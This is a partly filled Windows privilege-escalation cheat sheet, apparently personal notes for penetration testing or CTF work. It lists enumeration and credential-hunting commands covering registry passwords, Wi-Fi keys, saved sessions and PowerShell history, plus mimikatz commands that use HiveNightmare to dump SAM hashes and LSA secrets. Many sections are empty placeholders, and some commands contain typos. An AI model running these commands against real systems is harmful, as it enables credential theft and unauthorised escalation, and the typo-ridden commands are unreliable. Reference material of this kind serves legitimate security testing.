# Windows Privilege Escalation Guide

Strong influence: https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#powershell-transcript

<!-- Auto-generated TOC -->
[TOC]

## 1. Introduction and Methodology
### 1.1. Systematic Approach
[Content here]

### 1.2. Quick Wins vs Deep Enumeration
[Content here]

### 1.3. Command Line and PowerShell Usage
[Content here]

### 1.4. Environmental Preparation
```
systeminfo | findstr /B /C:"OS Name" /C:"OS Version"
wmic qfe
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE%


set
Get-ChildItem Env: | ft Key,Value
wmic logicaldisk get caption || fsutil fsinfo drives
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"} | ft Name,Root


```

## 2. Initial Enumeration

### 2.1. Operating System Information
```powershell
systeminfo | findstr /B /C:"OS Name" /C:"OS Version" # Windows Version and Configuration
wmic qfe # Patches and updates
wmic os get osarchitecture || echo %PROCESSOR_ARCHITECTURE% # Architecture
set #env variables
Get-ChildItem Env: | ft Key,Value #env variables

wmic logicaldisk get caption || fsutil fsinfo drives # List all drives
wmic logicaldisk get caption,description,providername # List all drives
Get-PSDrive | where {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}| ft Name,Root # List all drives


# Default Writeable Folders
C:\Windows\System32\Microsoft\Crypto\RSA\MachineKeys
C:\Windows\System32\spool\drivers\color
C:\Windows\System32\spool\printers
C:\Windows\System32\spool\servers
C:\Windows\tracing
C:\Windows\Temp
C:\Users\Public
C:\Windows\Tasks
C:\Windows\System32\tasks
C:\Windows\SysWOW64\tasks
C:\Windows\System32\tasks_migrated\microsoft\windows\pls\system
C:\Windows\SysWOW64\tasks\microsoft\windows\pls\system
C:\Windows\debug\wia
C:\Windows\registration\crmlog
C:\Windows\System32\com\dmp
C:\Windows\SysWOW64\com\dmp
C:\Windows\System32\fxstmp
C:\Windows\SysWOW64\fxstmp


## Antivirus Enumeration

# Enumerate antivirus on a box with
WMIC /Node:localhost /Namespace:\\root\SecurityCenter2 Path AntivirusProduct Get displayName
```

### 2.2. User Context and Privileges
```powershell
echo %USERNAME% || whoami #Get current username
$env:username #Get current username


whoami /priv 
whoami /groups # List user privilege

#List all users
net user ## Make sure you do it to your own
whoami /all 
Get-LocalUser | ft Name,Enabled,LastLogon 
Get-ChildItem C:\Users -Force | select Name 

$env:usernadsc #List logon requirements; useable for bruteforcing
net accounts  #List logon requirements; useable for bruteforcing

net user administrator # Details specific to one user
net user admin # Details specific to one user
net user %USERNAME% # Details specific to one user

## Groups
net localgroup administrators # Details about group
Get-LocalGroupMember Administrators | ft Name, PrincipalSource # Details about group
Get-LocalGroupMember Administrateurs | ft Name, PrincipalSource # Details about group
```

### 2.3. Network Configuration
```powershell

# Get Domain Controllers
nltest /DCLIST:DomainName 
nltest /DCNAME:DomainName 
nltest /DSGETDC:DomainName 

# List all network interfaces, IP, and DNS.
ipconfig /all 
Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address 
Get-DnsClientServerAddress -AddressFamily IPv4 | ft 

route print # List routing tables
Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex 

arp -A # List ARP table
Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State 

#Current connections
netstat -ano

#Network Shares
net share
powershell Find-DomainShare -ComputerDomain domain.local

#SNMP Configuration
reg query HKLM\SYSTEM\CurrentControlSet\Services\SNMP /s
Get-ChildItem -path HKLM:\SYSTEM\CurrentControlSet\Services\SNMP -Recurse
```

### 2.4. Service and Process Analysis
```powershell
# Commands here
```

### 2.5. Registry Enumeration
```powershell
# Commands here
```

### 2.6. Scheduled Tasks
```powershell

schtasks /query /fo LIST 2>nul | findstr TaskName
schtasks /query /fo LIST /v > schtasks.txt; cat schtask.txt | grep "SYSTEM\|Task To Run" | grep -B 1 SYSTEM
Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName,TaskPath,State

### Startup Tasks ###
wmic startup get caption,command
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\R
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
dir "C:\Documents and Settings\All Users\Start Menu\Programs\Startup"
dir "C:\Documents and Settings\%username%\Start Menu\Programs\Startup"
```

### 2.7. Password hunting
```powershell
# General Searches
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config 2>nul >> results.txt
findstr /spin "password" *.*

# For a certain name
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini

Use Snaffpoint for Sharepoint if needed: https://github.com/nheiniger/SnaffPoint

# Registry searches
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K

reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" # Windows Autologin
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon" 2>nul | findstr "DefaultUserName DefaultDomainName DefaultPassword" 
reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP" # SNMP parameters
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" # Putty clear text proxy credentials
reg query "HKCU\Software\ORL\WinVNC3\Password" # VNC credentials
reg query HKEY_LOCAL_MACHINE\SOFTWARE\RealVNC\WinVNC4 /v password

reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

# Unattend files
C:\unattend.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\system32\sysprep.inf
C:\Windows\system32\sysprep\sysprep.xml

# IIS Web config
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
C:\inetpub\wwwroot\web.config

# Other files
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
%WINDIR%\System32\drivers\etc\hosts
C:\ProgramData\Configs\*
C:\Program Files\Windows PowerShell\*
dir c:*vnc.ini /s /b
dir c:*ultravnc.ini /s /b


# Wifi Passwords
netsh wlan show profile
netsh wlan show profile <SSID> key=clear
cls & echo. & for /f "tokens=4 delims=: " %a in ('netsh wlan show profiles ^| find "Profile "') do @echo off > nul & (netsh wlan show profiles name=%a key=clear | findstr "SSID Cipher Content" | find /v "Number" & echo.) & @echo on


Sticky Notes passwords
\Users\<user>\AppData\Local\Packages\Microsoft.MicrosoftStickyNotes_8wekyb3d8bbwe\LocalState\plum.sqlite

# Passwords stored in services
## Saved session information for PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP using [SessionGopher](https://github.com/Arvanaghi/SessionGopher)

https://raw.githubusercontent.com/Arvanaghi/SessionGopher/master/SessionGopher.ps1
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss

Passwords stored in Key Manager (Will pop up in GUI)
rundll32 keymgr,KRShowKeyMgr


Find git repositories 
dir /s /b .git
# or PowerShell
Get-ChildItem -Path C:\ -Filter .git -Recurse -ErrorAction SilentlyContinue -Directory
# or
Get-ChildItem -Path C:\ -Filter *.git -Recurse -ErrorAction SilentlyContinue -Directory

find / -name ".git" -type d 2>/dev/null
# or
find / -name "*.git" -type d 2>/dev/null


# Powershell history
type %userprofile%\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type C:\Users\swissky\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
cat (Get-PSReadlineOption).HistorySavePath
cat (Get-PSReadlineOption).HistorySavePath | sls passw

# Powershell Transcript
C:\Users\<USERNAME>\Documents\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt
C:\Transcripts\<DATE>\PowerShell_transcript.<HOSTNAME>.<RANDOM>.<TIMESTAMP>.txt


# Password in Alternate Data Stream
PS > Get-Item -path flag.txt -Stream *
PS > Get-Content -path flag.txt -Stream Flag




```

## 3. Core Attack Vectors

### 3.1. Service-Based Attacks

#### 3.1.1. Unquoted Service Paths
```powershell
# Commands here
```

#### 3.1.2. Weak Service Permissions
```powershell
# Commands here
```

#### 3.1.3. DLL Hijacking
```powershell
# Commands here
```

#### 3.1.4. Service Binary Manipulation
```powershell
# Commands here
```

### 3.2. Registry-Based Attacks

#### 3.2.1. AlwaysInstallElevated
```powershell
# Commands here
```

#### 3.2.2. AutoRun Entries
```powershell
# Commands here
```

#### 3.2.3. Service Configurations
```powershell
# Commands here
```

### 3.3. Token-Based Attacks

#### 3.3.1. Token Privileges
```powershell
# Commands here
```

#### 3.3.2. Token Manipulation
```powershell
# Commands here
```

#### 3.3.3. Named Pipe Impersonation
```powershell
# Commands here
```

### 3.4. File System Attacks

#### 3.4.1. Weak Permissions
[Content here]

#### 3.4.2. Startup Folders
```powershell
# Commands here
```

#### 3.4.3. Binary Hijacking
[Content here]

## 4. Credential Hunting

### 4.1. Memory Extraction
```powershell
# Commands here
```

### 4.2. Registry Locations
```powershell
# Commands here
```

### 4.3. Configuration Files
```powershell
# Commands here
```

### 4.4. Service Accounts
```powershell
# Commands here
```

### 4.5. PowerShell History
```powershell
# Commands here
```

### 4.6. Browser Data
```powershell
# Commands here
```

### 4.7. Cached Credentials
[Content here]

## 5. System Vulnerabilities

### 5.1. Missing Patches
```powershell
# Commands here
```

### 5.2. Kernel Exploits
```powershell
# Commands here
```

### 5.3. Known CVEs
[Content here]
```
### HiveNightmare
> CVE-2021–36934 allows you to retrieve all registry hives (SAM,SECURITY,SYSTEM) in Windows 10 and 11 as a non-administrator user

C:\Windows\System32> icacls config\SAM
config\SAM BUILTIN\Administrators:(I)(F)
           NT AUTHORITY\SYSTEM:(I)(F)
           BUILTIN\Users:(I)(RX)    <-- this is wrong - regular users should not have read access!

mimikatz> token::whoami /full
# List shadow copies available
mimikatz> misc::shadowcopies
# Extract account from SAM databases
mimikatz> lsadump::sam /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /sam:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SAM

# Extract secrets from SECURITY
mimikatz> lsadump::secrets /system:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM /security:\\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SECURITY


```

### 5.4. Driver Vulnerabilities
[Content here]

### 5.5. WSL Weaknesses
[Content here]

## 6. Active Directory Integration

### 6.1. Domain Enumeration
```powershell
# Commands here
```

### 6.2. Kerberos Attacks
```powershell
# Commands here
```

### 6.3. Group Policy
[Content here]

### 6.4. Trust Relationships
[Content here]

### 6.5. LAPS
```powershell
### LAPS Settings

Extract `HKLM\Software\Policies\Microsoft Services\AdmPwd` from Windows Registry.

- LAPS Enabled: AdmPwdEnabled
- LAPS Admin Account Name: AdminAccountName
- LAPS Password Complexity: PasswordComplexity
- LAPS Password Length: PasswordLength
- LAPS Expiration Protection Enabled: PwdExpirationProtectionEnabled
```

## 7. File Transfer and Network Techniques

### 7.1. File Transfer Methods
```powershell
# Commands here
```

### 7.2. Port Forwarding
```powershell
# Commands here
```

### 7.3. Tunneling
```powershell
# Commands here
```

### 7.4. Network Service Exposure
[Content here]

## 8. Automation Tools

### 8.1. Enumeration Tools
```powershell
# Commands here
```

### 8.2. Exploitation Tools
```powershell
# Commands here
```

### 8.3. Custom Scripts
[Content here]

### 8.4. Tool Selection Strategy
[Content here]

## 9. System Management

### 9.1. Service Management
```powershell
# Commands here
```

### 9.2. System Control
```powershell
# Commands here
```

### 9.3. Recovery Options
[Content here]

### 9.4. Event Logs
[Content here]

## 10. Best Practices and Notes

### 10.1. General Guidelines
[Content here]

### 10.2. Quick Wins Checklist
[Content here]

### 10.3. Important File Locations
```powershell
# Commands here
```

### 10.4. Common Misconfigurations
[Content here]

### 10.5. Command Reference
```powershell
# Commands here
```

### 10.6. Evasion Techniques
[Content here]

## 11. Advanced Topics

### 11.1. Custom Exploit Development
[Content here]

### 11.2. Advanced Token Manipulation
[Content here]

### 11.3. Kernel Mode Exploits
[Content here]

### 11.4. Advanced Persistence Techniques
[Content here]

### 11.5. EDR Evasion
[Content here]

## 12. Appendices

### 12.1. Windows Version Specific Attacks
[Content here]

### 12.2. Common CVE Reference
[Content here]

### 12.3. Tool Installation Guide
[Content here]

### 12.4. PowerShell Security Bypass Methods
[Content here]

### 12.5. Common Exploits and Their Requirements
[Content here]



Cheatsheets
https://github.com/netbiosX/Checklists/blob/master/Windows-Privilege-Escalation.md


Windows quick runs:
* Birds eye view
	* Show all drives
		* Get-PSDrive | Where-Object {$_.Provider -like "Microsoft.PowerShell.Core\FileSystem"}; Get-SmbShare | Get-SmbShareAccess
	* Installed OS/Architecture
		* systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
	* whoami /priv
	* whoami /groups
	* systeminfo
	* cd C:\inetpub
	* Environmental Variables Check
		* Get-ChildItem env: | Sort-Object Name
	* net start
	* net share
	* net user
	* net localgroup
	* cmdkey /list

* Weak Registry Permissions
	* Get-Acl HTLM:\System\CurrentControlSet\Services\regsvc | Format-List
* Scheduled Tasks
	* schtasks /query /fo LIST /v
	* Get-ScheduledTask | where {$_.TaskPath -notlike "\Microsoft*"} | ft TaskName, TaskPath, State
* AlwaysInstallElevated
	* reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
	* reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
* Autoruns:
	* reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
* Passwords
	* reg query HKLM /f password /t REG_SZ /s
	* reg query HKCU /f password /t REG_SZ /s
	* reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s
	* cmdkey /list
	* Get-ChildItem -Path .\ -Filter *pass* -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.Name -like '*.config' }
	* findstr /si "password" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb
	* findstr /si "emily" *.xml *.ini *.txt *.config *.json *.env *.yaml *.yml *.php *.js *.py *.sql *.md *.log *.cfg *.properties *.htaccess *.asp *.aspx *.jsp *.bat *.cmd *.sh *.dockerfile *.docker-compose *.pem *.cer *.key *.crt *.gitignore *.svn *.html *.htm *.vb *.pl *.rb
	* Get-ChildItem -Path C:\Users -Include *.txt,*.xml,*.config,*.ini,*.log,*.bat -File -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern "password","credentials","api_key","secret" -ErrorAction SilentlyContinue
	* netsh wlan show profile | Select-String "All User Profile" | ForEach-Object { $name=$_.ToString().Split(":")[-1].Trim(); netsh wlan show profile name="$name" key=clear }
	* Get-ChildItem -Path "HKCU:\Software\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue | ForEach-Object { Get-ItemProperty $_.PSPath }
* SAM
	* type C:\Windows\System32\config\SAM
	* type C:\Windows\System32\config\SYSTEM
	* type C:\Windows\System32\config\RegBack
* Unique files
	* Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\Users\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path "C:\$Recycle.bin" -Recurse -Force -ErrorAction SilentlyContinue
	* Get-ChildItem -Path "C:\$Recycle.bin" -Recurse -Force -ErrorAction SilentlyContinue -Attributes Hidden,System
	* Get-ChildItem -Path C:\Users\ -Include id_rsa,id_dsa,id_ecdsa,id_ed25519 -File -Recurse -ErrorAction SilentlyContinue
	* Get-ChildItem -Path C:\Users -Include .gitconfig,.npmrc,.docker\config.json,.aws\credentials,.azure\credentials,.ssh\config -File -Recurse -ErrorAction SilentlyContinue -Force
	* Get-ChildItem -Path $env:TEMP -Include *.exe,*.dll,*.bat,*.ps1,*.vbs,*.tmp -File -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime
* Powershell history
	* (Get-PSReadlineOption).HistorySavePath
		* type((Get-PSReadlineOption).HistorySavePath)
* Check if RDP is enabled and who can connect
	* Get-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -Name "fDenyTSConnections"
* Check for WMI access rights
	* Get-WmiObject -Query "SELECT * FROM __SystemSecurity" -Namespace "root\subscription"
* Check Local Security Policy
	* secedit /export /cfg C:\temp\secpol.cfg
* Check last logs written to
	* Get-ChildItem -Path C:\Windows\Logs -Recurse -ErrorAction SilentlyContinue | Select-Object FullName, LastWriteTime | Sort-Object LastWriteTime -Descending
* Find all non-Microsoft installed software
	* Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\*, HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* -ErrorAction SilentlyContinue | Where-Object { $_.Publisher -and $_.Publisher -notlike "*Microsoft*" -and $_.Publisher -ne "" } | Select-Object DisplayName, Publisher, InstallDate, DisplayVersion | Sort-Object Publisher
* Unquoted service paths
	* Get-WmiObject -Class Win32_Service | Where-Object {$_.PathName -notlike '"*"' -and $_.PathName -notlike 'C:\Windows*'} | Select-Object Name, PathName, StartMode
* UAC Settings
	* reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v EnableLUA
* Find all powershell scripts (it'll be a lot)
	* Get-ChildItem -Path C:\ -Include *.ps1 -File -Recurse -ErrorAction SilentlyContinue
* Show event logs
	* wevtutil el
* Find files modified in the last 24 hours
	* Get-ChildItem -Path C:\ -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-1) } | Select-Object FullName, LastWriteTime
* Unprotected named pipes
	* [System.IO.Directory]::GetFiles("\\.\\pipe\\") | ForEach-Object { try { Get-Acl $_ -ErrorAction Stop } catch {} }
* Enumerate installed .NET Versions:
	* Get-ChildItem "HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP" -Recurse | Get-ItemProperty -Name Version -ErrorAction SilentlyContinue